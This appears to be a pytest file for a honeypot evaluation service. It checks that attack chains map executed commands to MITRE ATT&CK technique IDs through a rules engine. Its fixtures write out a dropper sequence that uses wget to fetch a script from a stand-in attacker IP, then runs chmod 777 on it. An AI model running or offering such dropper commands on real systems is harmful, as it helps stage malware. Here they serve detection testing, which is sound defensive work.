from app.services.compaction import CompactedCommand
from app.services.evaluation.static.chains import Chain, load_chains, verify_chain


def _cmd(event_id: str, command: str) -> CompactedCommand:
    return CompactedCommand(
        event_id=event_id, timestamp="2026-08-30T10:00:00Z", command=command
    )


def test_every_chain_declares_expected_techniques() -> None:
    chains = load_chains()
    assert chains
    assert all(c.expected_technique_ids for c in chains)


def test_an_executed_chain_is_verified_through_the_rules_engine() -> None:
    chain = Chain(
        id="dropper",
        steps=["cd /tmp", "wget http://198.51.100.7/x.sh", "chmod 777 x.sh"],
        expected_technique_ids=["T1105", "T1222.002"],
    )
    executed = [
        _cmd("e-1", "cd /tmp"),
        _cmd("e-2", "wget http://198.51.100.7/x.sh"),
        _cmd("e-3", "chmod 777 x.sh"),
    ]

    results = verify_chain(chain, executed)
    observed = {r.expected_technique_id: r for r in results if r.fact_status == "observed"}

    assert "T1105" in observed
    # The evidence chain is the point: technique -> command -> event -> rule.
    assert observed["T1105"].cowrie_event_id == "e-2"
    assert observed["T1105"].matched_rule_id == "T1105"
    assert observed["T1105"].command == "wget http://198.51.100.7/x.sh"


def test_a_technique_the_honeypot_never_produced_is_not_observed() -> None:
    # The honeypot swallowed the chmod, so T1222.002 must come back
    # not_observed -- a real defect signal, distinct from unknown.
    chain = Chain(
        id="dropper",
        steps=["wget http://198.51.100.7/x.sh", "chmod 777 x.sh"],
        expected_technique_ids=["T1105", "T1222.002"],
    )
    executed = [_cmd("e-2", "wget http://198.51.100.7/x.sh")]

    results = {r.expected_technique_id: r for r in verify_chain(chain, executed)}

    assert results["T1105"].fact_status == "observed"
    assert results["T1222.002"].fact_status == "not_observed"
    assert results["T1222.002"].cowrie_event_id is None
